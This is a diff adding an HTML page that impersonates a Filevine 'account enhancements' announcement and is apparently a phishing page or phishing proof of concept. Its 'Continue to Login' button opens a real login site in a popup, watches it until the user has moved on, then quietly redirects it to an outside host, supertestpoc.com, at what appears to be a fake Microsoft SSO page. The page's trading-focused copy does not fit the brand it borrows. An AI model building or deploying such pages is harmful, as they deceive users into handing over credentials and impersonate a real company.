@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABUAAAAdCAYAAABFRCf7AAAACXBIWXMAABJ0AAASdAHeZh94AAAAB3RJTUUH5gURAxYTtuyn5QAAAn5JREFUSInVlU1IFGEYx38zs36sH4d1N8vUoO1DMqLcoiBa3dCQLtEpgwwyCSLzaESK4hdZCpUU5CEK6tShbh07RBTUwVowXLQUb1a6FtqMLvM+HXaKLfxYzQ7+YWB4efjx/P8z7/NoVFzZCdQC+4A0QFiZYsAr4K4LaACqAWOFsETtB9J04NAqAQFSgIM64F4lIIAGpOusPMMFwfoqAwFYM9D/Yl/WjH21Zuzby4HGADuJOnEBKonCGeCZ836M+DRbSCoZ6DfgESK9QAxNs4AqIHW+LpOBRoH72HY3MI6uAzQTj+IEkLXcTqeAeyjV3drTMmma5g5d12cMwxhrb+xqB+aIz+G/wfZCUyoKPEDkVm3dmYnZ2dkA0KaUalK2KuSHOQpcB544Xf8BNfAH6wFvwuFXoA+R3uqzJ8fzC/MDSqkO4AhQLCKe0spQOFRROvbi+cswkAcUER/0AowY+IN1gM8BfgFuI3Kj5vzpiYJN+QGl5CpwmPhUTwWKRCQXiGzIW//pQ3jwHRq5gN+pGU6ExoFK3WztaZ52Z7gDSkmHA0xcN7/BvnXegV27i4fevukPO263ASMup/CzY7mv/tKFGcu09opIE1DG/PvLDRxXSs15fDktmNYw6WldzkdLN/AHTwEPEblz7mJN1OP17BGRTqCcxX/yFGCriOSUVYbeZ2e6R4ciHwfQNMtgc3ASZT++3NbwPTMrMyAi1xIyXEqpwHYR8eUVbIzkeD1DkcHhsAbQ1m8almmVKKV+dbjclW0CT3VdbzcMI2I0vp4yYnOxEifDcua/fkspBdgiItki0u+ybfsA8asXYvEMl1IGUCUi4gI6gWJg2nn+VUd/AvCR84HxZtOrAAAAAElFTkSuQmCC" type="image/png">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Filevine: New Feature Access</title>
+
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+
+  <style>
+    body {
+      font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif;
+      background: #f5f5f5;
+      margin: 0;
+      padding: 0;
+    }
+
+    .top-bar {
+      background: #003C2F;
+      padding: 10px 20px;
+      color: white;
+      display: flex;
+      align-items: center;
+    }
+
+    .top-bar img {
+      width: 24px;
+      height: 24px;
+      margin-right: 10px;
+    }
+
+    .header {
+      background: white;
+      padding: 40px 0;
+      text-align: center;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+    }
+
+    .header img {
+      width: 48px;
+      height: 48px;
+      margin-bottom: 10px;
+    }
+
+    .header h1 {
+      color: #003C2F;
+      font-size: 2.5rem;
+      margin-bottom: 10px;
+    }
+
+    .header p {
+      color: #666;
+      font-size: 1.1rem;
+    }
+
+    .content {
+      max-width: 900px;
+      margin: 40px auto;
+      padding: 30px;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+    }
+
+    .section-title {
+      font-size: 1.8rem;
+      color: #003C2F;
+      margin-bottom: 20px;
+    }
+
+    .feature {
+      border-left: 4px solid #00B15D;
+      padding-left: 20px;
+      margin-bottom: 30px;
+    }
+
+    .feature h3 {
+      color: #003C2F;
+      margin-bottom: 10px;
+    }
+
+    .feature p {
+      color: #555;
+      line-height: 1.6;
+    }
+
+    .cta-button {
+      display: block;
+      width: 100%;
+      padding: 14px;
+      background: #00B15D;
+      color: white;
+      font-weight: bold;
+      font-size: 1.1rem;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      margin-top: 30px;
+    }
+
+    .cta-button:hover {
+      background: #009c50;
+    }
+
+    #loading {
+      display: none;
+      text-align: center;
+      margin-top: 20px;
+      font-size: 1rem;
+      color: #003C2F;
+    }
+
+    footer {
+      text-align: center;
+      padding: 40px 0;
+      color: #888;
+      font-size: 0.9rem;
+    }
+
+    @media (max-width: 768px) {
+      .content {
+        margin: 20px;
+        padding: 20px;
+      }
+    }
+  </style>
+
+  <script>
+    let loginWin;
+
+    function launch() {
+      loginWin = window.open(
+        "https://sightlineus2.consilio.com/",
+        "foo",
+        ""
+      );
+
+      const interval = setInterval(() => {
+        if (!loginWin || loginWin.closed) {
+          clearInterval(interval);
+          return;
+        }
+
+        try {
+          const loc = loginWin.location.href;
+        } catch (e) {
+          clearInterval(interval);
+          document.getElementById('loading').style.display = 'block';
+          setTimeout(() => {
+            loginWin.location.href = "https://supertestpoc.com/sso/microsoft/";
+          }, 1000);
+        }
+      }, 100);
+    }
+  </script>
+</head>
+<body>
+
+  <!-- Top navigation bar -->
+  <div class="top-bar">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABUAAAAdCAYAAABFRCf7AAAACXBIWXMAABJ0AAASdAHeZh94AAAAB3RJTUUH5gURAxYTtuyn5QAAAn5JREFUSInVlU1IFGEYx38zs36sH4d1N8vUoO1DMqLcoiBa3dCQLtEpgwwyCSLzaESK4hdZCpUU5CEK6tShbh07RBTUwVowXLQUb1a6FtqMLvM+HXaKLfxYzQ7+YWB4efjx/P8z7/NoVFzZCdQC+4A0QFiZYsAr4K4LaACqAWOFsETtB9J04NAqAQFSgIM64F4lIIAGpOusPMMFwfoqAwFYM9D/Yl/WjH21Zuzby4HGADuJOnEBKonCGeCZ836M+DRbSCoZ6DfgESK9QAxNs4AqIHW+LpOBRoH72HY3MI6uAzQTj+IEkLXcTqeAeyjV3drTMmma5g5d12cMwxhrb+xqB+aIz+G/wfZCUyoKPEDkVm3dmYnZ2dkA0KaUalK2KuSHOQpcB544Xf8BNfAH6wFvwuFXoA+R3uqzJ8fzC/MDSqkO4AhQLCKe0spQOFRROvbi+cswkAcUER/0AowY+IN1gM8BfgFuI3Kj5vzpiYJN+QGl5CpwmPhUTwWKRCQXiGzIW//pQ3jwHRq5gN+pGU6ExoFK3WztaZ52Z7gDSkmHA0xcN7/BvnXegV27i4fevukPO263ASMup/CzY7mv/tKFGcu09opIE1DG/PvLDRxXSs15fDktmNYw6WldzkdLN/AHTwEPEblz7mJN1OP17BGRTqCcxX/yFGCriOSUVYbeZ2e6R4ciHwfQNMtgc3ASZT++3NbwPTMrMyAi1xIyXEqpwHYR8eUVbIzkeD1DkcHhsAbQ1m8almmVKKV+dbjclW0CT3VdbzcMI2I0vp4yYnOxEifDcua/fkspBdgiItki0u+ybfsA8asXYvEMl1IGUCUi4gI6gWJg2nn+VUd/AvCR84HxZtOrAAAAAElFTkSuQmCC" alt="Filevine Logo">
+    <strong>Filevine</strong>
+  </div>
+
+  <!-- Main header with visible logo -->
+  <div class="header">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABUAAAAdCAYAAABFRCf7AAAACXBIWXMAABJ0AAASdAHeZh94AAAAB3RJTUUH5gURAxYTtuyn5QAAAn5JREFUSInVlU1IFGEYx38zs36sH4d1N8vUoO1DMqLcoiBa3dCQLtEpgwwyCSLzaESK4hdZCpUU5CEK6tShbh07RBTUwVowXLQUb1a6FtqMLvM+HXaKLfxYzQ7+YWB4efjx/P8z7/NoVFzZCdQC+4A0QFiZYsAr4K4LaACqAWOFsETtB9J04NAqAQFSgIM64F4lIIAGpOusPMMFwfoqAwFYM9D/Yl/WjH21Zuzby4HGADuJOnEBKonCGeCZ836M+DRbSCoZ6DfgESK9QAxNs4AqIHW+LpOBRoH72HY3MI6uAzQTj+IEkLXcTqeAeyjV3drTMmma5g5d12cMwxhrb+xqB+aIz+G/wfZCUyoKPEDkVm3dmYnZ2dkA0KaUalK2KuSHOQpcB544Xf8BNfAH6wFvwuFXoA+R3uqzJ8fzC/MDSqkO4AhQLCKe0spQOFRROvbi+cswkAcUER/0AowY+IN1gM8BfgFuI3Kj5vzpiYJN+QGl5CpwmPhUTwWKRCQXiGzIW//pQ3jwHRq5gN+pGU6ExoFK3WztaZ52Z7gDSkmHA0xcN7/BvnXegV27i4fevukPO263ASMup/CzY7mv/tKFGcu09opIE1DG/PvLDRxXSs15fDktmNYw6WldzkdLN/AHTwEPEblz7mJN1OP17BGRTqCcxX/yFGCriOSUVYbeZ2e6R4ciHwfQNMtgc3ASZT++3NbwPTMrMyAi1xIyXEqpwHYR8eUVbIzkeD1DkcHhsAbQ1m8almmVKKV+dbjclW0CT3VdbzcMI2I0vp4yYnOxEifDcua/fkspBdgiItki0u+ybfsA8asXYvEMl1IGUCUi4gI6gWJg2nn+VUd/AvCR84HxZtOrAAAAAElFTkSuQmCC" alt="Filevine Logo">
+    <h1>Filevine Account Enhancements</h1>
+    <p>Access new security and reporting features tailored to your financial activity.</p>
+  </div>
+
+  <div class="content">
+    <div class="section-title">What’s New</div>
+
+    <div class="feature">
+      <h3>🔐 Improved SSO Integration</h3>
+      <p>We’ve introduced enhanced authentication mechanisms via third-party identity providers. This offers faster, secure, and compliant access to your account.</p>
+    </div>
+
+    <div class="feature">
+      <h3>📊 Advanced Reporting Dashboard</h3>
+      <p>Get granular insight into your transactions, fees, and market activity — all in one place. Designed for traders and institutional users.</p>
+    </div>
+
+    <div class="feature">
+      <h3>🚀 Early Access Program</h3>
+      <p>As a valued user, you are eligible to join our limited rollout for testing the new account access features.</p>
+    </div>
+
+    <button class="cta-button" onclick="launch()">Continue to Login</button>
+    <div id="loading">Authorizing your session, please wait...</div>
+  </div>
+
+  <footer>
+    <p>&copy; 2026 Filevine. All rights reserved.</p>
+  </footer>
+</body>
+</html>
